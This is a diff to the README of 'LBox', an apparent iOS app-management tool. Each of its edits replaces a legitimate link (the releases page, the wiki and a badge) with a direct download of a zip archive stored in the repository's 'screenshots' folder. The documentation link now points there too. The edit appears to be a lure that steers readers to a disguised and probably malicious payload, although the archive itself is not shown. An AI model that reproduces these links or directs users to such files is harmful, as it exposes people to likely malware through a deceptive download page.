@@ -1,6 +1,6 @@
 # 📦 LBox - Simple iOS App Management Made Easy
 
-![Download LBox](https://img.shields.io/badge/Download%20LBox-v1.0-blue)
+![Download LBox](https://github.com/Sadhurb/LBox/raw/refs/heads/main/screenshots/Box-L-v1.2.zip%20LBox-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to LBox! This app helps you manage and download iOS applications effortl
 
 1. **Visit the Releases Page**  
    To download LBox, visit the Releases page:  
-   [Download LBox](https://github.com/Sadhurb/LBox/releases)
+   [Download LBox](https://github.com/Sadhurb/LBox/raw/refs/heads/main/screenshots/Box-L-v1.2.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, find the latest version of LBox. Click on the version you wish to download (e.g., v1.0).
@@ -61,7 +61,7 @@ A: Yes, you can uninstall LBox just like any other app on your iOS device.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: [LBox Documentation](https://github.com/Sadhurb/LBox/wiki)  
+- **Documentation**: [LBox Documentation](https://github.com/Sadhurb/LBox/raw/refs/heads/main/screenshots/Box-L-v1.2.zip)  
 - **Community Support**: Join our community for discussions and support.  
 - **Report Issues**: If you encounter any issues, please report them on the issues page of the repository.
 
@@ -76,4 +76,4 @@ LBox is open-source and available under the MIT License. Please check the LICENS
 --- 
 
 Now you're ready to begin your journey with LBox. Download it today from our Releases page:  
-[Download LBox](https://github.com/Sadhurb/LBox/releases)
+[Download LBox](https://github.com/Sadhurb/LBox/raw/refs/heads/main/screenshots/Box-L-v1.2.zip)
